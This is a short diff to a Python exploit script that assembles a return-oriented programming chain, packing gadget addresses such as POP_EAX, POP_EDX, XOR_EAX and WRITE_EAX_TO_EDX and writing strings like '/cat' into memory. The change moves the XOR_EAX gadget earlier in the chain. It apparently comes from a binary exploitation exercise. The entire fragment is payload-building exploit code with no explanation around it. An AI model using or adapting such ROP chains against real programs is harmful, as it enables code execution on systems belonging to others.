@@ -32,10 +32,10 @@ payload += POP_EAX
 payload += "/cat"
 payload += WRITE_EAX_TO_EDX
 # --
+payload += XOR_EAX
 payload += POP_EDX
 payload += struct.pack('<I', DATA_PTR + 8)
 payload += POP_EAX
-payload += XOR_EAX
 payload += WRITE_EAX_TO_EDX
 # ---
 payload += POP_EDX
